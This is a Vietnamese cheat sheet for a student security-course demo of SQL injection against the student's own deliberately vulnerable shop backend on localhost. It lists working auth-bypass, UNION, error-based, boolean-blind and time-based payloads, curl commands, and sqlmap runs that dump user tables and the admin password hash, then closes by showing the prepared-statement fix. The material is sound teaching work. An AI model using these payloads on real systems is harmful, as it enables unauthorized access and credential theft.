# Cheat Sheet — Demo 5 SQLi trên HPB-Shop

> Dùng khi thuyết trình BTL ATBM. Mở file này trong VSCode preview hoặc print để cầm theo.
> Trước khi demo: đảm bảo đang ở branch `feat/sqli-demo`, backend đang chạy ở `localhost:8080`.
> Sau demo cần show "bản đã fix": chiếu repo HPB-Shop-BE ở `main` (dùng JPA prepared statements).
>
> **Lưu ý MySQL:** Comment `--` phải có khoảng trắng phía sau (`-- `) thì MySQL mới nhận.

---

## Lỗ hổng 1 — Auth Bypass

**Endpoint:** `POST /api/auth/login`  
**UI:** `http://localhost:5500/Dang-nhap.html`

**Payload (gõ vào form):**
- Username: `admin' -- ` *(có dấu cách sau --)*
- Password: bất kỳ

**Curl test:**
```bash
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"loginId\":\"admin' -- \",\"password\":\"x\"}"
```
Expected: JSON chứa `"role":"admin"` và `"token":"eyJ..."`

**Payload OR:**
```bash
curl -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"loginId\":\"' OR role='admin' -- \",\"password\":\"x\"}"
```

**sqlmap:**
```bash
sqlmap -u "http://localhost:8080/api/auth/login" \
  --method POST --data '{"loginId":"admin","password":"x"}' \
  --headers "Content-Type: application/json" \
  --level 5 --risk 3 --batch
```

---

## Lỗ hổng 2 — UNION-based

**Endpoint:** `GET /api/products/search?keyword=`  
**UI:** `http://localhost:5500/Trang-chu.html` (ô tìm kiếm)

**Xác định số cột (ORDER BY) — dùng `%'` để query khớp tất cả sản phẩm:**
```
%' ORDER BY 8--    → 12 sản phẩm (hợp lệ)
%' ORDER BY 9--    → 500 error  (cột 9 không tồn tại) → có đúng 8 cột
```

**Payload UNION dump users (URL-decoded để đọc):**
```
%' UNION SELECT user_id, username, email, 0, password, role, 0, 'hack' FROM users-- 
```

**Curl test (URL-encoded):**
```bash
curl "http://localhost:8080/api/products/search?keyword=%25%27%20UNION%20SELECT%20user_id%2Cusername%2Cemail%2C0%2Cpassword%2Crole%2C0%2C%27hack%27%20FROM%20users--%20"
```
Expected: JSON array chứa cả sản phẩm lẫn user (name=username, brand=email, description=role)

**sqlmap dump bảng users:**
```bash
sqlmap -u "http://localhost:8080/api/products/search?keyword=test" \
  --batch --dbs

sqlmap -u "http://localhost:8080/api/products/search?keyword=test" \
  --batch -D HPBSports_DB --tables

sqlmap -u "http://localhost:8080/api/products/search?keyword=test" \
  --batch -D HPBSports_DB -T users --dump
```

---

## Lỗ hổng 3 — Error-based

**Endpoint:** `GET /api/products/{id}`  
**UI:** Sửa thẳng URL trên trình duyệt

**Payload (path, URL-decoded):**
```
1 AND extractvalue(1, concat(0x7e, (SELECT version())))
1 AND extractvalue(1, concat(0x7e, (SELECT database())))
1 AND extractvalue(1, concat(0x7e, (SELECT password FROM users WHERE username='admin')))
```

**Curl (URL-encoded):**
```bash
# Leak version
curl "http://localhost:8080/api/products/1%20AND%20extractvalue(1,concat(0x7e,(SELECT%20version())))"

# Leak database name
curl "http://localhost:8080/api/products/1%20AND%20extractvalue(1,concat(0x7e,(SELECT%20database())))"

# Leak admin password hash
curl "http://localhost:8080/api/products/1%20AND%20extractvalue(1,concat(0x7e,(SELECT%20password%20FROM%20users%20WHERE%20username='admin')))"
```
Expected: response 500 với `"message"` chứa `XPATH syntax error: '~8.4.7'` / `'~HPBSports_DB'` / `'~$2a$10$...'`

**sqlmap:**
```bash
sqlmap -u "http://localhost:8080/api/products/1" \
  --technique=E --batch --current-user --current-db --dbs
```

---

## Lỗ hổng 4 — Boolean Blind

**Endpoint:** `GET /api/products/filter?brand=`  
**UI:** `http://localhost:5500/San-pham-theo-hang.html?brand=...`

**Payload (URL-decoded):**
```
Yonex' AND 1=1-- 
Yonex' AND 1=2-- 
Yonex' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='$'-- 
```

**Curl test:**
```bash
# TRUE → trả về sản phẩm Yonex
curl "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%201%3D1--%20"

# FALSE → empty
curl "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%201%3D2--%20"

# Đoán ký tự đầu hash admin (BCrypt bắt đầu bằng $)
curl "http://localhost:8080/api/products/filter?brand=Yonex%27%20AND%20SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27),1,1)%3D%27%24%27--%20"
```
Expected: TRUE → 4 sản phẩm Yonex | FALSE → 0 | Đoán `$` → 4 (TRUE)

**sqlmap (boolean technique):**
```bash
sqlmap -u "http://localhost:8080/api/products/filter?brand=Yonex" \
  --technique=B --batch -D HPBSports_DB -T users -C username,password --dump
```

---

## Lỗ hổng 5 — Time-based Blind

**Endpoint:** `GET /api/customer/orders/my-orders/{userId}` — yêu cầu JWT

**Bước 1: Lấy JWT bằng Auth Bypass:**
```bash
TOKEN=$(curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"loginId\":\"admin' -- \",\"password\":\"x\"}" \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")
echo $TOKEN
```

**Bước 2: Payload (path, URL-decoded):**
```
1 AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='$',SLEEP(3),0)
```

**Curl test:**
```bash
# TRUE → delay ≥ 3s
time curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/customer/orders/my-orders/1%20AND%20IF(SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27),1,1)%3D%27%24%27%2CSLEEP(3)%2C0)"

# FALSE → instant
time curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/api/customer/orders/my-orders/1%20AND%20IF(SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27admin%27),1,1)%3D%27X%27%2CSLEEP(3)%2C0)"
```
Expected: TRUE real time ≥ 3s | FALSE real time < 1s

**sqlmap (time-based technique):**
```bash
sqlmap -u "http://localhost:8080/api/customer/orders/my-orders/1" \
  --headers "Authorization: Bearer $TOKEN" \
  --technique=T --batch \
  -D HPBSports_DB -T users -C username,password --dump
```

---

## Workflow demo (~7-8 phút)

| Phút | Bước | Action |
|------|------|--------|
| 0:00 | Chiếu cửa hàng "bình thường" | `http://localhost:5500/Trang-chu.html` |
| 0:30 | **Auth Bypass** — login form | Username: `admin' -- ` → vào Admin Dashboard |
| 1:30 | **UNION-based** — ô tìm kiếm | Payload dump users vào kết quả tìm kiếm |
| 3:00 | **Error-based** — sửa URL | Leak version + password hash qua error message |
| 4:00 | **Boolean Blind** — sqlmap | `sqlmap --technique=B` dump password admin |
| 5:30 | **Time-based** — sqlmap | `sqlmap --technique=T` (giải thích "không có output nhưng vẫn leak được") |
| 7:00 | **So sánh** | `git checkout main` + restart → tất cả payload thất bại (JPA prepared statements) |

---

## Khôi phục bản an toàn (sau demo)

```bash
cd /Users/justminh/Desktop/DH/BTL_ATBM
git checkout main
lsof -ti:8080 | xargs kill -9
export JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk-25.jdk/Contents/Home
export PATH=$JAVA_HOME/bin:$PATH
cd HPB-Shop-BE/web_project
nohup mvn -DskipTests spring-boot:run > /tmp/hpb-backend.log 2>&1 &
```

Branch `feat/sqli-demo` vẫn được giữ nguyên để dùng lại cho buổi demo sau.
